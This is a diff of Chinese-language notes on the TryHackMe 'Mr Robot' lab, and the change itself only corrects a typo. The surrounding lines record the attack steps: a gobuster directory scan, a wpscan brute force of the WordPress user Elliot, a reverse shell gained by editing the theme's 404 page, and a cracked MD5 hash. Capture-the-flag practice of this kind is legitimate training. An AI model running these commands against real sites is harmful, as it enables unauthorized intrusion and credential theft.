@@ -10,7 +10,7 @@ gobuster dir  -u http://whoisrobot.com/  -w /usr/share/dirb/wordlists/common.txt
 2.使用wpscan指定用戶名暴力破解,取得密碼ER28-0652
 wpscan --url whoisrobot.com --usernames Elliot --passwords /home/kali/timmy/TryHackMe/Mr_Robot/fsocity.dic --max-threads 50
 3.登入Theme頁面可以編輯404報錯頁面，改為reverse.php 重新訪問404頁面取得reverse shell
-4.在robot木立下查找到md5密碼
+4.在robot目錄下查找到md5密碼
 c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
 
 
